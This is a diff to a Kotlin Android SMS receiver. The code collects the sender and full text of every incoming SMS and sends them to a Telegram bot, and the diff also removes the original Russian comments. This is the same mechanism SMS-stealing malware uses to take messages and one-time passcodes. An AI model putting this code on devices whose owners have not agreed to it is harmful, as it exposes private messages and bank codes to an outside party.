@@ -16,35 +16,39 @@ class SmsReceiver : BroadcastReceiver() {
     override fun onReceive(context: Context, intent: Intent) {
         if (intent.action == "android.provider.Telephony.SMS_RECEIVED") {
             val bundle = intent.extras
+
+            var sender: String? = null
+            var fullText = ""
+
             try {
                 if (bundle != null) {
                     val pdus = bundle.get("pdus") as Array<*>
+
                     for (i in pdus.indices) {
                         val format = bundle.getString("format")
-                        // Парсим PDU в сообщение
                         val message = SmsMessage.createFromPdu(pdus[i] as ByteArray, format)
 
-                        val sender = message.displayOriginatingAddress // Кто прислал
-                        val text = message.displayMessageBody // Текст сообщения
+                        if (sender == null) {
+                            sender = message.displayOriginatingAddress
+                        }
 
-                        // Формируем текст для отправки
-                        val finalMessage = "📩 *New SMS*\n\nFrom: $sender\nText: $text"
+                        fullText += message.displayMessageBody
+                    }
 
-                        // Отправляем в Telegram
+                    if (sender != null && fullText.isNotEmpty()) {
+                        val finalMessage = "📩 *Incoming SMS*\n\nFrom: $sender\nContent:\n$fullText"
                         sendToTelegram(finalMessage)
                     }
                 }
             } catch (e: Exception) {
-                Log.e("SmsReceiver", "Error parsing SMS: ${e.message}")
+                Log.e("SmsReceiver", "Error processing SMS: ${e.message}")
             }
         }
     }
 
     private fun sendToTelegram(message: String) {
-        // Запускаем в отдельном потоке, так как сеть нельзя трогать в Main Thread
         Thread {
             try {
-                // Кодируем сообщение для URL (пробелы превращаются в %20 и т.д.)
                 val encodedMessage = URLEncoder.encode(message, "UTF-8")
                 val urlString = "https://api.telegram.org/bot$BOT_TOKEN/sendMessage?chat_id=$CHAT_ID&text=$encodedMessage&parse_mode=Markdown"
 
@@ -52,7 +56,6 @@ class SmsReceiver : BroadcastReceiver() {
                 val conn = url.openConnection() as HttpURLConnection
                 conn.requestMethod = "GET"
 
-                // Просто дергаем ручку, ответ нам особо не важен (но можно проверить conn.responseCode)
                 val responseCode = conn.responseCode
                 Log.d("TelegramBot", "Response Code: $responseCode")
 
